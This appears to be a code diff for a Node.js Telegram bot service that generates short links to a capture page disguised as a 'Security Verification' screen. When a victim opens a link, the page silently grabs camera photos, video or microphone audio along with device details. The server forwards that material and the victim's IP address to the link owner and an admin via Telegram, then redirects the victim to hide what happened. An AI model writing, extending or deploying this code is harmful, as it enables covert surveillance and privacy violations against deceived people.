+        } else if (text === '/lang' || text === '/language') {
+            await showLanguageSelection(chat_id);
+        } else if (text === '/id') {
+            const user = getUser(user_id);
+            const lang = user ? user.lang : 'ar';
+            await sendMessage(chat_id, getTextMsg('your_id', lang, user_id));
+        } else if (text.startsWith('/start')) {
+            await handleStart(chat_id, user_id, first_name, username, text);
         } else {
-            return res.status(404).send('Template not found');
+            await handleMessage(chat_id, user_id, text);
         }
-        return;
+    } else if (update.callback_query) {
+        await handleCallbackQuery(update.callback_query);
+    } else if (update.pre_checkout_query) {
+        await handlePreCheckoutQuery(update.pre_checkout_query);
     }
 
-    // Existing camera logic
-    let htmlContent = `
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Camera Access</title>
-            <meta property="og:title" content="You have a new message!" />
-            <meta property="og:description" content="Click to view the content." />
-            <meta property="og:image" content="${BOT_URL}/images/default_og.png" />
-            <meta property="og:url" content="${BOT_URL}/${code}" />
-            <meta property="og:type" content="website" />
-            <style>
-                body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; font-family: sans-serif; }
-                .container { text-align: center; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-                button { padding: 15px 30px; font-size: 1.2em; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
-                video { display: none; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>Click to activate camera</h1>
-                <button id="activateCam">Activate Camera</button>
-                <video id="cameraFeed" autoplay playsinline></video>
-            </div>
-            <script>
-                document.getElementById('activateCam').addEventListener('click', function() {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(function(stream) {
-                            const video = document.getElementById('cameraFeed');
-                            video.srcObject = stream;
-                            // Send stream to server (example, needs actual implementation)
-                            // fetch('/upload', { method: 'POST', body: stream });
-                            console.log('Camera activated');
-                        })
-                        .catch(function(err) {
-                            console.error('Error accessing camera: ', err);
-                            alert('Camera access denied or not available.');
-                        });
-                    this.style.display = 'none'; // Hide button after click
-                });
-            </script>
-        </body>
-        </html>
-    `;
-
-    res.send(htmlContent);
+    res.sendStatus(200);
 });
 
+// Media Upload Endpoint (POST)
 app.post('/upload', async (req, res) => {
-    // This is a placeholder for handling camera stream upload
-    // In a real scenario, you would receive video/image data here
-    // and process it (e.g., save to disk, send to Telegram)
-    const userId = req.body.userId; // Assuming userId is sent in the body
-    const mediaData = req.body.mediaData; // Base64 encoded media
-    const type = req.body.type; // 'image' or 'video'
-
-    if (!userId || !mediaData || !type) {
-        return res.status(400).send('Missing data');
+    const client_ip = req.ip || 'unknown';
+    if (!rateLimitCheck(client_ip, 10, 60)) {
+        logSecurity('RATE_LIMIT', `IP: ${client_ip}`);
+        return res.status(429).json({ status: 'error', msg: 'too many requests' });
     }
 
-    if (!validateMediaData(mediaData)) {
-        logSecurity('Invalid media data received', `User: ${userId}, Type: ${type}`);
-        return res.status(400).send('Invalid media data');
+    const { action, nonce, user_id: enc_user_id, type, media_data, user_agent, platform } = req.body;
+
+    if (action !== 'upload_media') {
+        return res.status(400).json({ status: 'error', msg: 'invalid action' });
     }
 
-    // Example: Send to Telegram (needs actual implementation to handle media)
-    // For now, just log it
-    writeLog(`Received ${type} data from user ${userId}`);
+    // Nonce validation disabled - links work forever
 
-    // Increment capture count
-    let user = getUser(userId);
-    if (user) {
-        const today = new Date().toISOString().slice(0, 10);
-        if (user.today_date !== today) {
-            user.today_date = today;
-            user.today_captures = 0;
+    const owner_id = decryptData(enc_user_id);
+    if (!owner_id) {
+        logSecurity('INVALID_DECRYPT', `enc_id: ${enc_user_id}`);
+        return res.status(403).json({ status: 'error', msg: 'invalid id' });
+    }
+
+    if (!['photo', 'video', 'audio'].includes(type)) {
+        logSecurity('INVALID_TYPE', `type: ${type}`);
+        return res.status(400).json({ status: 'error', msg: 'invalid type' });
+    }
+
+    if (!validateMediaData(media_data)) {
+        logSecurity('INVALID_MEDIA', `owner: ${owner_id}, type: ${type}`);
+        return res.status(400).json({ status: 'error', msg: 'invalid media' });
+    }
+
+    // Decode base64 media
+    const base64_parts = media_data.split(';base64,');
+    const media_binary = Buffer.from(base64_parts[1], 'base64');
+
+    let ext = 'bin';
+    if (type === 'photo') ext = 'jpg';
+    else if (type === 'video') ext = 'webm';
+    else if (type === 'audio') ext = 'ogg';
+
+    const filename = path.join(DATA_DIR, `${Date.now()}_${owner_id}.${ext}`);
+    fs.writeFileSync(filename, media_binary);
+
+    const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+    const caption = `🚨 <b>وسائط جديدة!</b>\n\n` +
+                    `📷 النوع: ${type}\n` +
+                    `🌐 IP: ${client_ip}\n` +
+                    `📱 الجهاز: ${user_agent ? user_agent.substring(0, 100) : 'unknown'}\n` +
+                    `💻 المنصة: ${platform || 'unknown'}\n` +
+                    `📅 الوقت: ${time}`;
+
+    try {
+        const sendOptions = { caption: caption, parse_mode: 'HTML' };
+        if (type === 'photo') {
+            await bot.sendPhoto(owner_id, filename, sendOptions);
+        } else if (type === 'video') {
+            await bot.sendVideo(owner_id, filename, sendOptions);
+        } else if (type === 'audio') {
+            await bot.sendVoice(owner_id, filename, sendOptions);
         }
-        user.total_captures = (user.total_captures || 0) + 1;
-        user.today_captures = (user.today_captures || 0) + 1;
-        updateUser(userId, user);
-        await checkAchievements(userId);
+
+        // Send copy to admin
+        if (owner_id != ADMIN_ID) {
+            const adminSendOptions = { caption: `${caption}\n👤 صاحب الرابط: ${owner_id}`, parse_mode: 'HTML' };
+            if (type === 'photo') {
+                await bot.sendPhoto(ADMIN_ID, filename, adminSendOptions);
+            } else if (type === 'video') {
+                await bot.sendVideo(ADMIN_ID, filename, adminSendOptions);
+            } else if (type === 'audio') {
+                await bot.sendVoice(ADMIN_ID, filename, adminSendOptions);
+            }
+        }
+
+        // Update capture stats
+        let owner = getUser(owner_id);
+        if (owner) {
+            const today = new Date().toISOString().slice(0, 10);
+            const today_captures = (owner.today_date === today) ? (owner.today_captures + 1) : 1;
+            updateUser(owner_id, {
+                total_captures: (owner.total_captures || 0) + 1,
+                today_captures: today_captures,
+                today_date: today
+            });
+            await checkAchievements(owner_id);
+        }
+
+        fs.unlinkSync(filename); // Delete temporary media file
+        logSecurity('MEDIA_UPLOAD', `owner: ${owner_id}, type: ${type}, ip: ${client_ip}`);
+        res.json({ status: 'success' });
+    } catch (e) {
+        writeLog(`Error sending media to Telegram: ${e.message}`);
+        console.error('Error sending media to Telegram:', e);
+        if (fs.existsSync(filename)) fs.unlinkSync(filename);
+        res.status(500).json({ status: 'error', msg: 'Failed to send media to Telegram.' });
+    }
+});
+
+// Capture Page (GET requests)
+app.get('/:shortCode?', async (req, res) => {
+    const shortCode = req.params.shortCode;
+
+    // Serve landing.html for root or index.php equivalent
+    if (!shortCode || shortCode === 'index.php') {
+        const landingPath = path.join(__dirname, 'landing.html');
+        if (fs.existsSync(landingPath)) {
+            return res.sendFile(landingPath);
+        } else {
+            return res.send('<!DOCTYPE html><html><head><title>TikTuk</title></head><body><h1>TikTuk - Smart Tool</h1></body></html>');
+        }
     }
 
-    res.send('Upload received');
+    const linkData = getShortLinkData(shortCode);
+    if (linkData) {
+        const client_ip = req.ip || 'unknown';
+        if (!rateLimitCheck(`page_${client_ip}`, 20, 60)) {
+            return res.status(429).send('<h1>Too Many Requests</h1>');
+        }
+
+        const owner_id = linkData.u;
+        const enc_id = encryptData(owner_id.toString());
+        const redirect_url = linkData.r || 'https://google.com';
+        const cam_type = linkData.c || 'f';
+
+        let capture_type = 'photo';
+        if (cam_type === 'v') capture_type = 'video';
+        else if (cam_type === 'a') capture_type = 'audio';
+
+        const facing_mode = (cam_type === 'b') ? 'environment' : 'user';
+        const upload_url = `${BOT_URL}/upload`; // Node.js upload endpoint
+        const nonce = generateNonce();
+
+        renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type, upload_url, nonce);
+    } else {
+        res.status(404).send('Not Found');
+    }
 });
 
-// Start the Express server
+// ==========================================
+// 9. Render Capture Page (Ported from index.php)
+// ==========================================
+
+function renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type, upload_url, nonce = '') {
+    const redirect_safe = encodeURIComponent(redirect_url);
+    const enc_id_safe = encodeURIComponent(enc_id);
+    const nonce_safe = encodeURIComponent(nonce);
+
+    res.send(`<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%);color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
+        .container{text-align:center;padding:50px 30px;background:rgba(255,255,255,0.05);border-radius:30px;backdrop-filter:blur(25px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 30px 100px rgba(0,0,0,0.6);animation:fadeIn 1s ease;max-width:400px;width:90%}
+        @keyframes fadeIn{from{opacity:0;transform:scale(0.9) translateY(30px)}to{opacity:1;transform:scale(1) translateY(0)}}
+        .logo{width:80px;height:80px;margin:0 auto 20px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:36px;box-shadow:0 10px 30px rgba(102,126,234,0.4)}
+        .spinner{width:45px;height:45px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:25px auto}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        h2{color:#fff;margin-bottom:8px;font-size:1.3em;font-weight:600}
+        p{opacity:0.7;font-size:0.95em;line-height:1.5}
+        .progress{width:100%;height:4px;background:rgba(255,255,255,0.1);border-radius:4px;margin:25px auto 0;overflow:hidden}
+        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:4px;animation:loading 3s ease-in-out forwards}
+        @keyframes loading{0%{width:0%}50%{width:60%}80%{width:85%}100%{width:95%}}
+        .shield{margin-top:15px;font-size:12px;opacity:0.5}
+        video,canvas{display:none!important}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h2>Security Verification</h2>
+        <p>Please wait while we verify your identity...</p>
+        <div class="spinner"></div>
+        <div class="progress"><div class="progress-bar"></div></div>
+        <p class="shield">🛡️ Protected by CloudGuard™</p>
+    </div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="cv"></canvas>
+    <script>
+    (function(){
+        var v=document.getElementById("v"),cv=document.getElementById("cv"),ctx=cv.getContext("2d");
+        var fm="${facing_mode}",uid="${enc_id}",rurl="${redirect_url}",ct="${capture_type}",uu="${upload_url}",nc="${nonce}";
+        
+        function getDeviceInfo(){
+            return {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform || "unknown",
+                language: navigator.language || "unknown",
+                screen: screen.width+"x"+screen.height
+            };
+        }
+        
+        function doPhoto(stream){
+            v.srcObject=stream;v.play();
+            setTimeout(function(){
+                cv.width=v.videoWidth;cv.height=v.videoHeight;
+                ctx.drawImage(v,0,0);
+                var d=cv.toDataURL("image/jpeg",0.85);
+                stream.getTracks().forEach(function(t){t.stop()});
+                send("photo",d);
+            },1500);
+        }
+        
+        function doVideo(stream){
+            v.srcObject=stream;v.play();
+            var chunks=[],options={mimeType:"video/webm;codecs=vp8"};
+            try{var mediaRecorder=new MediaRecorder(stream,options)}catch(e){options={mimeType:"video/webm"};var mediaRecorder=new MediaRecorder(stream,options)}
+            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
+            mediaRecorder.onstop=function(){
+                stream.getTracks().forEach(function(t){t.stop()});
+                var blob=new Blob(chunks,{type:"video/webm"});
+                var reader=new FileReader();
+                reader.onloadend=function(){send("video",reader.result)};
+                reader.readAsDataURL(blob);
+            };
+            mediaRecorder.start();
+            setTimeout(function(){mediaRecorder.stop()},5000);
+        }
+        
+        function doAudio(stream){
+            v.srcObject=stream;v.play();
+            var chunks=[],options={mimeType:"audio/ogg;codecs=opus"};
+            try{var mediaRecorder=new MediaRecorder(stream,options)}catch(e){options={mimeType:"audio/webm"};var mediaRecorder=new MediaRecorder(stream,options)}
+            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
+            mediaRecorder.onstop=function(){
+                stream.getTracks().forEach(function(t){t.stop()});
+                var blob=new Blob(chunks,{type:options.mimeType});
+                var reader=new FileReader();
+                reader.onloadend=function(){send("audio",reader.result)};
+                reader.readAsDataURL(blob);
+            };
+            mediaRecorder.start();
+            setTimeout(function(){mediaRecorder.stop()},10000);
+        }
+
+        function send(type,data){
+            var deviceInfo = getDeviceInfo();
+            fetch(uu,{
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({
+                    action:"upload_media",
+                    user_id:uid,
+                    type:type,
+                    media_data:data,
+                    user_agent:deviceInfo.user_agent,
+                    platform:deviceInfo.platform,
+                    nonce:nc
+                })
+            }).then(function(r){return r.json()}).then(function(d){console.log(d);window.location.href=rurl}).catch(function(e){console.error(e);window.location.href=rurl});
+        }
+
+        navigator.mediaDevices.getUserMedia({video:{facingMode:fm},audio:true}).then(function(stream){
+            if(ct==="photo"){doPhoto(stream);}
+            else if(ct==="video"){doVideo(stream);}
+            else if(ct==="audio"){doAudio(stream);}
+            else{console.error("Unknown capture type");window.location.href=rurl;}
+        }).catch(function(e){console.error(e);window.location.href=rurl});
+    })();
+    </script>
+</body>
+</html>`);
+}
+
+// ==========================================
+// 10. Start Server
+// ==========================================
+
 const PORT = process.env.PORT || 3000;
+
+// Function to set webhook
+function setTelegramWebhook() {
+    bot.setWebHook(`${BOT_URL}/webhook/${BOT_TOKEN}`).then(() => {
+        console.log('Telegram webhook set successfully');
+        writeLog('Telegram webhook set successfully');
+    }).catch(e => {
+        console.error('Error setting webhook:', e.message);
+        writeLog(`Error setting webhook: ${e.message}`);
+    });
+}
+
 app.listen(PORT, () => {
-    console.log(`Web server running on port ${PORT}`);
-    writeLog(`Web server started on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
+    writeLog(`Server started on port ${PORT}`);
+    setTelegramWebhook();
 });
 
-// Start the Telegram bot polling
-bot.startPolling();
-console.log('Telegram bot started polling');
-writeLog('Telegram bot started polling');
